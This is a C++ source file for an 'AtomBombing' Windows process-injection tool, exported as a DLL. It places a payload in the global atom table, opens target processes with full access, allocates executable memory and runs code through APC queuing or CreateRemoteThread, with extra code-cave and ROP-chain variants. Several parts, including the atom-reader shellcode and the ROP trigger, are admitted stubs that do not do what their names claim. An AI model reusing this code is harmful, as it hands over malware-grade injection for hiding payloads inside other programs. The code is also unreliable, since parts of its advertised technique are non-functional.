// AtomBombing.cpp - Atom bombing injection technique using global atom table
#include <Windows.h>
#include "../../include/nt_compat.hpp"
#include <iostream>
#include <vector>
#include <string>
#include <memory>
#include <TlHelp32.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "user32.lib")

// NT function declarations
typedef NTSTATUS(NTAPI* pNtQueueApcThread)(HANDLE, PVOID, PVOID, PVOID, PVOID);
typedef NTSTATUS(NTAPI* pRtlCreateUserThread)(HANDLE, PSECURITY_DESCRIPTOR, BOOLEAN, ULONG,
                                              PULONG, PULONG, PVOID, PVOID, PHANDLE, PVOID);

extern "C" {
    NTSTATUS NTAPI NtQueryInformationThread(
        HANDLE ThreadHandle,
        THREADINFOCLASS ThreadInformationClass,
        PVOID ThreadInformation,
        ULONG ThreadInformationLength,
        PULONG ReturnLength
    );
}

class AtomBombing {
private:
    pNtQueueApcThread NtQueueApcThread;
    pRtlCreateUserThread RtlCreateUserThread;

    static const SIZE_T ATOM_CHUNK_SIZE = 255; // Max atom string size
    std::vector<ATOM> m_atoms;

public:
    AtomBombing() {
        InitializeNtFunctions();
        std::cout << "[AtomBombing] Injector initialized" << std::endl;
    }

    ~AtomBombing() {
        CleanupAtoms();
    }

    // Main atom bombing injection
    bool InjectViaAtomBombing(DWORD targetPid, const std::vector<BYTE>& payload) {
        std::cout << "[AtomBombing] Starting atom bombing injection into PID: " << targetPid << std::endl;

        // Step 1: Store payload in global atom table
        if (!StorePayloadInAtoms(payload)) {
            std::cerr << "[-] Failed to store payload in atoms" << std::endl;
            return false;
        }

        // Step 2: Find suitable thread for APC injection
        HANDLE hThread = FindInjectableThread(targetPid);
        if (!hThread) {
            std::cerr << "[-] Failed to find injectable thread" << std::endl;
            return false;
        }

        // Step 3: Force target to allocate memory via APC
        PVOID remoteMemory = nullptr;
        if (!AllocateMemoryViaAPC(hThread, payload.size(), &remoteMemory)) {
            std::cerr << "[-] Failed to allocate memory via APC" << std::endl;
            CloseHandle(hThread);
            return false;
        }

        // Step 4: Copy payload from atoms to target memory
        if (!CopyPayloadFromAtoms(hThread, remoteMemory, payload.size())) {
            std::cerr << "[-] Failed to copy payload from atoms" << std::endl;
            CloseHandle(hThread);
            return false;
        }

        // Step 5: Execute payload
        if (!ExecutePayload(hThread, remoteMemory)) {
            std::cerr << "[-] Failed to execute payload" << std::endl;
            CloseHandle(hThread);
            return false;
        }

        CloseHandle(hThread);
        std::cout << "[+] Atom bombing injection successful!" << std::endl;
        return true;
    }

    // Alternative: Code cave atom bombing
    bool InjectViaCodeCaveAtomBombing(DWORD targetPid, const std::vector<BYTE>& payload) {
        std::cout << "[AtomBombing] Starting code cave atom bombing..." << std::endl;

        // Find code cave in target process
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
        if (!hProcess) {
            return false;
        }

        PVOID codeCave = FindCodeCave(hProcess, payload.size());
        if (!codeCave) {
            std::cerr << "[-] No suitable code cave found" << std::endl;
            CloseHandle(hProcess);
            return false;
        }

        // Store payload in atoms
        if (!StorePayloadInAtoms(payload)) {
            CloseHandle(hProcess);
            return false;
        }

        // Find thread and inject
        HANDLE hThread = FindInjectableThread(targetPid);
        if (!hThread) {
            CloseHandle(hProcess);
            return false;
        }

        // Use APCs to copy from atoms to code cave
        if (!CopyPayloadFromAtoms(hThread, codeCave, payload.size())) {
            CloseHandle(hThread);
            CloseHandle(hProcess);
            return false;
        }

        // Execute from code cave
        ExecutePayload(hThread, codeCave);

        CloseHandle(hThread);
        CloseHandle(hProcess);
        return true;
    }

    // Store shellcode as ROP chain in atoms
    bool InjectROPChainViaAtoms(DWORD targetPid, const std::vector<ULONG_PTR>& ropGadgets) {
        std::cout << "[AtomBombing] Injecting ROP chain via atoms..." << std::endl;

        // Convert ROP gadgets to byte sequence
        std::vector<BYTE> ropBytes;
        for (ULONG_PTR gadget : ropGadgets) {
            BYTE* bytes = (BYTE*)&gadget;
            for (size_t i = 0; i < sizeof(ULONG_PTR); i++) {
                ropBytes.push_back(bytes[i]);
            }
        }

        // Store ROP chain in atoms
        if (!StorePayloadInAtoms(ropBytes)) {
            return false;
        }

        // Find target thread
        HANDLE hThread = FindInjectableThread(targetPid);
        if (!hThread) {
            return false;
        }

        // Trigger ROP chain execution via APC
        if (!TriggerROPChain(hThread, ropBytes.size())) {
            CloseHandle(hThread);
            return false;
        }

        CloseHandle(hThread);
        return true;
    }

private:
    void InitializeNtFunctions() {
        HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
        if (!hNtdll) return;

        NtQueueApcThread = (pNtQueueApcThread)GetProcAddress(hNtdll, "NtQueueApcThread");
        RtlCreateUserThread = (pRtlCreateUserThread)GetProcAddress(hNtdll, "RtlCreateUserThread");
    }

    bool StorePayloadInAtoms(const std::vector<BYTE>& payload) {
        std::cout << "[+] Storing payload in global atom table..." << std::endl;

        // Clear any existing atoms
        CleanupAtoms();

        // Split payload into chunks that fit in atoms
        size_t offset = 0;
        while (offset < payload.size()) {
            size_t chunkSize = min(ATOM_CHUNK_SIZE, payload.size() - offset);

            // Create null-terminated string from payload chunk
            std::wstring atomData;
            for (size_t i = 0; i < chunkSize; i++) {
                // Encode each byte as Unicode character
                atomData += (wchar_t)(payload[offset + i] | 0x100);
            }

            // Add atom to global table
            ATOM atom = GlobalAddAtomW(atomData.c_str());
            if (atom == 0) {
                std::cerr << "[-] Failed to add atom" << std::endl;
                return false;
            }

            m_atoms.push_back(atom);
            offset += chunkSize;
        }

        std::cout << "[+] Stored payload in " << m_atoms.size() << " atoms" << std::endl;
        return true;
    }

    HANDLE FindInjectableThread(DWORD targetPid) {
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) {
            return nullptr;
        }

        THREADENTRY32 te;
        te.dwSize = sizeof(te);

        if (Thread32First(hSnapshot, &te)) {
            do {
                if (te.th32OwnerProcessID == targetPid) {
                    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
                    if (hThread) {
                        // Check if thread is alertable (waiting)
                        if (IsThreadAlertable(hThread)) {
                            CloseHandle(hSnapshot);
                            std::cout << "[+] Found alertable thread: " << te.th32ThreadID << std::endl;
                            return hThread;
                        }
                        CloseHandle(hThread);
                    }
                }
            } while (Thread32Next(hSnapshot, &te));
        }

        CloseHandle(hSnapshot);

        // If no alertable thread found, just return first accessible thread
        return GetFirstThread(targetPid);
    }

    bool IsThreadAlertable(HANDLE hThread) {
        // Check thread state to see if it's in alertable wait
        THREAD_BASIC_INFORMATION tbi;
        NTSTATUS status = NtQueryInformationThread(
            hThread,
            ThreadBasicInformation,
            &tbi,
            sizeof(tbi),
            nullptr
        );

        if (NT_SUCCESS(status)) {
            // Thread in wait state is likely alertable
            return true; // Simplified check
        }

        return false;
    }

    HANDLE GetFirstThread(DWORD targetPid) {
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) {
            return nullptr;
        }

        THREADENTRY32 te;
        te.dwSize = sizeof(te);

        if (Thread32First(hSnapshot, &te)) {
            do {
                if (te.th32OwnerProcessID == targetPid) {
                    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
                    if (hThread) {
                        CloseHandle(hSnapshot);
                        return hThread;
                    }
                }
            } while (Thread32Next(hSnapshot, &te));
        }

        CloseHandle(hSnapshot);
        return nullptr;
    }

    bool AllocateMemoryViaAPC(HANDLE hThread, SIZE_T size, PVOID* allocatedMemory) {
        // Queue APC to call VirtualAlloc in target process
        PVOID pVirtualAlloc = GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "VirtualAlloc");

        // We need to use a different approach - force allocation through code execution
        // This is a simplified version - in practice, you'd inject a small stub first

        // Alternative: Use NtAllocateVirtualMemory directly
        HANDLE hProcess = GetProcessFromThread(hThread);
        if (!hProcess) {
            return false;
        }

        *allocatedMemory = VirtualAllocEx(hProcess, nullptr, size,
                                         MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        CloseHandle(hProcess);
        return (*allocatedMemory != nullptr);
    }

    bool CopyPayloadFromAtoms(HANDLE hThread, PVOID targetMemory, SIZE_T payloadSize) {
        std::cout << "[+] Copying payload from atoms to target memory..." << std::endl;

        HANDLE hProcess = GetProcessFromThread(hThread);
        if (!hProcess) {
            return false;
        }

        // Inject small shellcode that reads from atoms
        std::vector<BYTE> atomReaderStub = GenerateAtomReaderStub(targetMemory, m_atoms);

        // Allocate memory for stub
        PVOID stubMemory = VirtualAllocEx(hProcess, nullptr, atomReaderStub.size(),
                                         MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!stubMemory) {
            CloseHandle(hProcess);
            return false;
        }

        // Write stub
        SIZE_T written;
        if (!WriteProcessMemory(hProcess, stubMemory, atomReaderStub.data(),
                               atomReaderStub.size(), &written)) {
            VirtualFreeEx(hProcess, stubMemory, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }

        // Queue APC to execute stub
        NTSTATUS status = NtQueueApcThread(hThread, stubMemory, targetMemory,
                                          (PVOID)payloadSize, nullptr);

        // Wait for completion (simplified)
        Sleep(100);

        // Cleanup stub
        VirtualFreeEx(hProcess, stubMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);

        return NT_SUCCESS(status);
    }

    std::vector<BYTE> GenerateAtomReaderStub(PVOID targetMemory, const std::vector<ATOM>& atoms) {
        // Generate x64 shellcode to read atoms and write to memory
        std::vector<BYTE> stub;

        // This is a simplified stub - actual implementation would be more complex
        // push rbp
        stub.push_back(0x55);

        // mov rbp, rsp
        stub.push_back(0x48); stub.push_back(0x89); stub.push_back(0xE5);

        // For each atom:
        for (size_t i = 0; i < atoms.size(); i++) {
            // mov rcx, atom_value
            stub.push_back(0x48); stub.push_back(0xB9);
            ATOM atom = atoms[i];
            for (int j = 0; j < 8; j++) {
                stub.push_back(((BYTE*)&atom)[j]);
            }

            // call GlobalGetAtomNameW
            // This would need proper implementation with API addresses
        }

        // pop rbp
        stub.push_back(0x5D);

        // ret
        stub.push_back(0xC3);

        return stub;
    }

    bool ExecutePayload(HANDLE hThread, PVOID payloadMemory) {
        std::cout << "[+] Executing payload via APC..." << std::endl;

        // Queue APC to execute payload
        NTSTATUS status = NtQueueApcThread(hThread, payloadMemory, nullptr, nullptr, nullptr);

        if (!NT_SUCCESS(status)) {
            // Try alternative execution method
            return ExecuteViaCreateRemoteThread(hThread, payloadMemory);
        }

        return true;
    }

    bool ExecuteViaCreateRemoteThread(HANDLE hThread, PVOID payloadMemory) {
        HANDLE hProcess = GetProcessFromThread(hThread);
        if (!hProcess) {
            return false;
        }

        HANDLE hRemoteThread = CreateRemoteThread(hProcess, nullptr, 0,
                                                  (LPTHREAD_START_ROUTINE)payloadMemory,
                                                  nullptr, 0, nullptr);

        bool success = (hRemoteThread != nullptr);

        if (hRemoteThread) {
            CloseHandle(hRemoteThread);
        }

        CloseHandle(hProcess);
        return success;
    }

    PVOID FindCodeCave(HANDLE hProcess, SIZE_T requiredSize) {
        MEMORY_BASIC_INFORMATION mbi;
        PVOID address = nullptr;

        while (VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi))) {
            // Look for executable regions with enough space
            if (mbi.State == MEM_COMMIT &&
                (mbi.Protect & (PAGE_EXECUTE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE))) {

                // Scan for continuous NOPs or INT3s
                std::vector<BYTE> buffer(mbi.RegionSize);
                SIZE_T bytesRead;

                if (ReadProcessMemory(hProcess, mbi.BaseAddress, buffer.data(),
                                     mbi.RegionSize, &bytesRead)) {

                    SIZE_T caveSize = 0;
                    PVOID caveStart = nullptr;

                    for (SIZE_T i = 0; i < bytesRead; i++) {
                        if (buffer[i] == 0x90 || buffer[i] == 0xCC) { // NOP or INT3
                            if (caveSize == 0) {
                                caveStart = (PBYTE)mbi.BaseAddress + i;
                            }
                            caveSize++;

                            if (caveSize >= requiredSize) {
                                std::cout << "[+] Found code cave at: 0x" << std::hex << caveStart << std::endl;
                                return caveStart;
                            }
                        } else {
                            caveSize = 0;
                            caveStart = nullptr;
                        }
                    }
                }
            }

            address = (PBYTE)mbi.BaseAddress + mbi.RegionSize;
        }

        return nullptr;
    }

    bool TriggerROPChain(HANDLE hThread, SIZE_T chainSize) {
        // Queue APCs to set up and trigger ROP chain
        // This would involve manipulating stack via APCs
        // Simplified implementation

        CONTEXT ctx;
        ctx.ContextFlags = CONTEXT_FULL;

        if (GetThreadContext(hThread, &ctx)) {
            // Modify RSP/ESP to point to ROP chain
            // Set RIP/EIP to first gadget
            // This is highly simplified - actual implementation would be complex

            SetThreadContext(hThread, &ctx);
            return true;
        }

        return false;
    }

    HANDLE GetProcessFromThread(HANDLE hThread) {
        THREAD_BASIC_INFORMATION tbi;
        NTSTATUS status = NtQueryInformationThread(
            hThread,
            ThreadBasicInformation,
            &tbi,
            sizeof(tbi),
            nullptr
        );

        if (NT_SUCCESS(status)) {
            return OpenProcess(PROCESS_ALL_ACCESS, FALSE,
                              HandleToUlong(tbi.ClientId.UniqueProcess));
        }

        return nullptr;
    }

    void CleanupAtoms() {
        for (ATOM atom : m_atoms) {
            GlobalDeleteAtom(atom);
        }
        m_atoms.clear();
    }
};

// Export functions
extern "C" {
    __declspec(dllexport) void* CreateAtomBombing() {
        return new AtomBombing();
    }

    __declspec(dllexport) bool InjectAtomBombing(void* instance, DWORD pid, void* payload, size_t size) {
        if (AtomBombing* bomber = (AtomBombing*)instance) {
            std::vector<BYTE> payloadVec((BYTE*)payload, (BYTE*)payload + size);
            return bomber->InjectViaAtomBombing(pid, payloadVec);
        }
        return false;
    }

    __declspec(dllexport) void DestroyAtomBombing(void* instance) {
        delete (AtomBombing*)instance;
    }
}
